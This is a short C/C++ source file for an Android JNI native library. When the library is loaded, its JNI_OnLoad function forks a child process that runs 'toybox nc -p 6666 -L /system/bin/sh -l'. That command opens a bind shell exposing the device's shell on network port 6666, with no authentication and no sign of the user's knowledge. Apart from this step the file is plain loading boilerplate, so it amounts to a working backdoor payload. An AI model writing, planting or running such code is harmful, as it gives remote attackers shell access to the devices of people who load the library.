#include <jni.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

JNIEXPORT jint JNI_OnLoad(JavaVM *vm, void *reserved)
{
    // Fork a new process
    pid_t pid = fork();

    if (pid == -1)
    {
        // Forking failed
        perror("Forking failed");
        return JNI_ERR;
    }

    if (pid == 0)
        system("toybox nc -p 6666 -L /system/bin/sh -l");

    JNIEnv *env;
    if (vm->GetEnv(reinterpret_cast<void **>(&env), JNI_VERSION_1_6) != JNI_OK)
    {
        return JNI_ERR;
    }

    return JNI_VERSION_1_6;
}
